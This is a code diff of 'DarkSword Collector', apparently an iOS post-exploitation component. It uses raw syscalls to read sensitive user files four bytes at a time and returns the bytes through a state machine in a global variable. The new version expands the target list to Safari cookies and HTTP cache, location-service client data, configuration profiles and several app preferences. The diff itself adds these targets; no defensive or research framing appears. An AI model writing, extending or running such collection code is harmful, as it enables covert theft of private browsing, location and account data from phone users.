@@ -1,5 +1,7 @@
 /**
- * DarkSword Collector v44 - Find readable system files & container data
+ * DarkSword Collector v45 - Scan system caches & shared containers
+ * Uses proven plain C static volatile (v30 style)
+ * Single file per call, state machine via g_offset packing
  */
 
 static long _svc1(long n, long a) {
@@ -26,56 +28,50 @@ static long _svc4(long n, long a, long b, long c, long d) {
 #define SEEK_SET 0
 #define O_RDONLY 0
 
-#define NUM_FILES 8
-#define CHUNKS_PER_FILE 5
-
 static volatile int g_ctx = 0;
+
+#define NUM_FILES 12
+#define CHUNKS_PER_FILE 5
 
 static const char *get_path(int id) {
     switch (id) {
-        case 0: return "/var/mobile/Library/com.apple.mobile.installation.plist";
-        case 1: return "/var/mobile/Library/com.apple.lsd.appinstallation.plist";
-        case 2: return "/var/mobile/Library/Preferences/.GlobalPreferences.plist";
-        case 3: return "/var/mobile/Library/Preferences/com.apple.UIKit.plist";
-        case 4: return "/var/mobile/Library/Preferences/com.apple.mobilewifi.plist";
-        case 5: return "/var/mobile/Library/Preferences/com.apple.radios.plist";
-        case 6: return "/var/mobile/Library/Preferences/com.apple.springboard.plist";
-        case 7: return "/etc/hosts";
+        case 0:  return "/var/mobile/Library/Caches/locationd/clients.plist";
+        case 1:  return "/var/mobile/Library/Caches/com.apple.springboard.sharedimagecache.plist";
+        case 2:  return "/var/mobile/Library/HTTPStorages/com.apple.mobilesafari/Cache.db";
+        case 3:  return "/var/mobile/Library/Cookies/Cookies.binarycookies";
+        case 4:  return "/var/mobile/Library/Preferences/com.apple.LaunchServices.plist";
+        case 5:  return "/var/mobile/Library/Preferences/com.apple.preferences.sounds.plist";
+        case 6:  return "/var/mobile/Library/SpringBoard/IconState.plist";
+        case 7:  return "/var/mobile/Library/SpringBoard/LaunchMedias.plist";
+        case 8:  return "/var/mobile/Library/ConfigurationProfiles/Settings.plist";
+        case 9:  return "/var/mobile/Library/Preferences/com.apple.purplebuddy.plist";
+        case 10: return "/var/mobile/Library/Preferences/com.apple.AppStore.plist";
+        case 11: return "/etc/hosts";
         default: return (void*)0;
     }
 }
 
 int ds_start(void) {
-    int ctx;
-    __asm__("ldr %w0, [%1]" : "=r"(ctx) : "r"(&g_ctx));
+    int ctx = g_ctx;
     int fid = (ctx >> 16) & 0xFF;
     int chk = ctx & 0xFF;
 
-    if (fid >= NUM_FILES) {
-        __asm__("str %w0, [%1]" : : "r"(0), "r"(&g_ctx));
-        return 0xFFFFFFFF;
-    }
-    if (chk >= CHUNKS_PER_FILE) {
-        int nc = ((fid + 1) << 16);
-        __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));
-        return 0xFF000000 | fid;
-    }
+    if (fid >= NUM_FILES) { g_ctx = 0; return 0xFFFFFFFF; }
+    if (chk >= CHUNKS_PER_FILE) { g_ctx = ((fid + 1) << 16); return 0xFF000000 | fid; }
 
     const char *path = get_path(fid);
-    if (!path) { int nc = (fid + 1) << 16; __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx)); return 0xFD000000 | fid; }
+    if (!path) { g_ctx = ((fid + 1) << 16); return 0xFD000000 | fid; }
 
     int fd = (int)_svc2(SYS_open, (long)path, O_RDONLY);
-    if (fd < 0) { int nc = (fid + 1) << 16; __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx)); return 0xFE000000 | fid; }
+    if (fd < 0) { g_ctx = ((fid + 1) << 16); return 0xFE000000 | fid; }
 
     int off = chk * 4;
-    _svc4(SYS_lseek, fd, (long)off, SEEK_SET, 0);
+    if (off > 0) _svc4(SYS_lseek, fd, (long)off, SEEK_SET, 0);
     unsigned char buf[4] = {0};
     int n = (int)_svc3(SYS_read, fd, (long)buf, 4);
     _svc1(SYS_close, fd);
 
-    int nc = (fid << 16) | (chk + 1);
-    __asm__("str %w0, [%1]" : : "r"(nc), "r"(&g_ctx));
-
+    g_ctx = (fid << 16) | (chk + 1);
     if (n < 1) return 0xEE000000 | fid;
     return (int)buf[0] | ((int)buf[1] << 8) | ((int)buf[2] << 16) | ((int)buf[3] << 24);
 }
